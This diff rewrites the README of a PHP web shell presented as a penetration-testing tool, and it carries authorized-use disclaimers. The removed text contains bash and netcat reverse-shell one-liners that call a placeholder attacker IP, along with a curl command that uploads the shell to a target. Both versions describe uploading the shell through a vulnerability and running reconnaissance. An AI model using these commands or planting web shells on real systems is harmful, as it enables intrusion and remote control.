@@ -1,78 +1,46 @@
-GitHub README.md formatında düzenlenmiş versiyonu hazırlıyorum. Markdown formatında ve görsellerle zenginleştirilmiş şekilde:
+# P1ckl3d Web Shell: A Comprehensive Guide to Advanced Web Shell for Security Testing
 
-# P1ckl3d Web Shell: Advanced Security Testing Tool 🛡️
+![P1ckl3d Web Shell](https://example.com/banner.png)
 
-![Security Banner](https://raw.githubusercontent.com/your-repo/assets/security-banner.png)
+> **⚠️ Important Security Notice**
+>
+> This tool is intended for **authorized security testing only**. Using this tool without explicit permission is **illegal** and could result in **serious legal consequences**.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub stars](https://img.shields.io/github/stars/0xP1ckl3d/p1ckled_web_shell)](https://github.com/0xP1ckl3d/p1ckled_web_shell/stargazers)
-[![GitHub issues](https://img.shields.io/github/issues/0xP1ckl3d/p1ckled_web_shell)](https://github.com/0xP1ckl3d/p1ckled_web_shell/issues)
+## 🔍 Introduction
 
-> ⚠️ **IMPORTANT**: This tool is strictly for authorized security testing only. Unauthorized use is prohibited.
+In the realm of **cybersecurity** and **penetration testing**, having the right tools is crucial for thorough security assessments. The **P1ckl3d Web Shell** is an advanced tool designed specifically for **security professionals** conducting authorized penetration testing.
 
-## 📚 Table of Contents
+## ✨ Key Features and Capabilities
 
-- [Features](#features)
-- [Installation](#installation)
-- [Usage Guide](#usage-guide)
-- [Advanced Features](#advanced-features)
-- [Security Considerations](#security-considerations)
-- [Troubleshooting](#troubleshooting)
-- [Contributing](#contributing)
-- [License](#license)
+| Feature                   | Description  |
+|---------------------------|--------------|
+| 🔄 **Dynamic Command Execution** | Execute real-time shell commands, maintain history, and avoid page reloads |
+| 📁 **File Management** | Seamless file uploads, directory navigation, and file downloads |
+| 🔍 **System Information Gathering** | Retrieve OS details, network configurations, user info, and security settings |
+| 🌐 **Network Reconnaissance** | Gather details about running processes, services, and open ports |
+| 🔑 **User Privilege Escalation Analysis** | Identify potential privilege escalation vectors |
 
-## 🚀 Features
+## 🛠️ Installation and Setup Guide
 
-### Core Capabilities
+### Prerequisites
+- A web server with PHP support
+- Proper authorization to conduct security testing
 
-```mermaid
-graph TD
-    A[P1ckl3d Web Shell] --> B[Command Execution]
-    A --> C[File Management]
-    A --> D[Reconnaissance]
-    A --> E[Reverse Shell]
-    B --> B1[Real-time Output]
-    B --> B2[Command History]
-    C --> C1[Upload/Download]
-    C --> C2[Directory Navigation]
-    D --> D1[System Info]
-    D --> D2[Network Analysis]
-    E --> E1[Bash Shell]
-    E --> E2[Netcat Shell]
+### Installation Steps
+1. **Download** the `webshell.php` file from the repository:
+   ```bash
+   git clone https://github.com/your-repo/P1ckl3d-Web-Shell.git
+   cd P1ckl3d-Web-Shell
+   ```
+2. **Identify** a suitable upload point on the target system.
+3. **Upload** the file through the identified vulnerability.
+4. **Access** the web shell through the uploaded URL.
 
-Key Features Breakdown
-🔧 Command Execution
-Real-time shell command execution
-Command history logging
-No page reload required
-📁 File Management
-File upload/download capabilities
-Directory navigation
-Hidden file access
-🔍 Reconnaissance Features
-System Information
-OS Details
-Kernel Version
-PHP Configuration
-Network Analysis
-Open Ports
-Active Connections
-Firewall Status
-Security Information
-User Accounts
-Permissions
-Security Configs
-💿 Installation
-Clone the repository:
-git clone https://github.com/0xP1ckl3d/p1ckled_web_shell.git
+## 🚀 How to Use P1ckl3d Web Shell
 
-Upload the webshell:
-# Example using curl (if applicable)
-curl -F "file=@webshell.php" http://target-server/upload.php
-
-📖 Usage Guide
-Basic Commands
-# List directory contents
+### Basic Commands
+```bash
+# Execute system commands
 command> ls -la
 
 # Change directory
@@ -80,64 +48,34 @@ command> cd /var/www
 
 # View file contents
 command> cat config.php
+```
 
-File Management Interface
+### Advanced Features
+- **Enumerate Running Processes:** `ps aux`
+- **Check Open Ports:** `netstat -tulnp`
+- **Retrieve User Information:** `whoami && id`
 
-Reconnaissance Tool
-# Run full system reconnaissance
-command> run discovery
+## ✅ Best Practices for Usage
 
-# Check specific system information
-command> sysinfo
+✔️ Always maintain detailed logs of your testing activities  
+✔️ Remove the web shell immediately after testing  
+✔️ Use **secure connections** when possible  
+✔️ Follow the target organization's **security testing guidelines**  
 
-🔧 Advanced Features
-System Information Gathering
-# Example output structure
-{
-    "os_info": {
-        "name": "Ubuntu 20.04.3 LTS",
-        "kernel": "5.4.0-42-generic"
-    },
-    "network": {
-        "interfaces": ["eth0", "lo"],
-        "open_ports": [80, 443, 22]
-    }
-}
+## 🔧 Troubleshooting
 
-Reverse Shell Capabilities
-# Bash reverse shell
-bash -i >& /dev/tcp/attacker-ip/4444 0>&1
+| Issue | Solution |
+|--------|------------|
+| **Permission Denied** | Check file permissions and user context |
+| **Upload Failed** | Verify file size limits and server configurations |
+| **Connection Issues** | Check network connectivity and firewall rules |
 
-# Netcat reverse shell
-nc -e /bin/sh attacker-ip 4444
+## 📜 Legal Disclaimer
+This tool is intended strictly for **ethical hacking and penetration testing** within legal boundaries. The authors and contributors **do not** take responsibility for **misuse or illegal activities** related to this software.
 
-🛡️ Security Considerations
+## 📫 Contact & Support
+For any queries, contributions, or issues, reach out via:
+📧 Email: security@yourdomain.com  
+💬 Discord: [Join our community](https://discord.gg/yourserver)  
+🐙 GitHub Issues: [Report a bug](https://github.com/your-repo/issues)
 
-⚠️ Critical Security Notes
-
-Only use on authorized systems
-Maintain detailed activity logs
-Remove after testing
-Follow security guidelines
-Monitor all activities
-🔧 Troubleshooting
-
-Common issues and solutions:
-
-Issue	Solution
-Permission Denied	Check file permissions and user context
-Upload Failed	Verify file size limits and server configs
-Connection Issues	Check network connectivity and firewalls
-🤝 Contributing
-Fork the repository
-Create your feature branch
-Commit changes
-Push to branch
-Create Pull Request
-📄 License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-📊 Project Stats
-
-🌟 Star History
